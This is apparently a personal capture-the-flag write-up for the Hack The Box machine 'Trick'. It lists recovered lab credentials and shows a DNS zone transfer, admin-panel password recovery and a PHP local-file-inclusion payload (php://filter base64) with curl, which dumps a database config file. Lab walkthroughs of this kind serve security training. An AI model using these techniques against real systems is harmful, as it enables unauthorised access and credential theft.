## Info

### Credential

| User       | Password                       | Service         | Note |
| ---------- | ------------------------------ | --------------- | ---- |
| Enemigosss | SuperGucciRainbowCake          | preprod-payroll |      |
| remo       | TrulyImpossiblePasswordLmao123 | database        |      |

## Path

### User

1. Do zone transfer and found a subdomain `preprod-payroll.trick.htb`, which shows a admin panel.

```
ice1187@ice1187-lab:~/repo/htb/trick (master)$ dig axfr trick.htb @trick.htb

; <<>> DiG 9.16.1-Ubuntu <<>> axfr trick.htb @trick.htb
;; global options: +cmd
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.              604800  IN      NS      trick.htb.
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1
preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
;; Query time: 172 msec
;; SERVER: 10.10.11.166#53(10.10.11.166)
;; WHEN: Sun Sep 04 21:24:50 CST 2022
;; XFR size: 6 records (messages 1, bytes 231)
```

2. `/users.php` shows a admin user `Enemigosss`. `/employee.php` show a user `John C Smith`.

3. According to the source code, when the ajax respone `1` or `2`, it should be something interesting. So I use my own `web-fuzz.py` script to brute force the password of `Enemigosss`, it found something, but its a error which `<b>21</b>` in in the error message. Cool :)

4. From the `/users.php` source code, we can found `manage_user.php`, then the password `SuperGucciRainbowCake` is in the source code. Thus, we become the admin of the website.

5. The website is written in PHP, so I looks for some upload functionality first. The site settings page is not shown in the admin panel, but it can be accessed at `/index.php?page=site_settings`, and it has a upload field. However, the request never success.

6. I find the `/index.php?page=` seems to be including the page with `.php` extension, e.g., `/users.php` is at `/index.php?page=users`. So I try to dump `/db_conenct.php` with `php://filter/convert.base64-encode/resource=db_connect`, and it success.

```bash
ice1187@ice1187-lab:~/repo/htb/trick (master)$ curl http://preprod-payroll.trick.htb/index.php?page=php://filter/convert.base64-encode/resource=db_connect
ice1187@ice1187-lab:~/repo/htb/trick (master)$ echo PD9waHAgDQoNCiRjb25uPSBuZXcgbXlzcWxpKCdsb2NhbGhvc3QnLCdyZW1vJywnVHJ1bHlJbXBvc3NpYmxlUGFzc3dvcmRMbWFvMTIzJywncGF5cm9sbF9kYicpb3IgZGllKCJDb3VsZCBub3QgY29ubmVjdCB0byBteXNxbCIubXlzcWxpX2Vycm9yKCRjb24pKTsNCg0K | base64 -d
<?php

$conn= new mysqli('localhost','remo','TrulyImpossiblePasswordLmao123','payroll_db')or die("Could not connect to mysql".mysqli_error($con));
```

## TODO

[ ] According to the official forum, more fuzzing on subdomains based on what have been found is key.
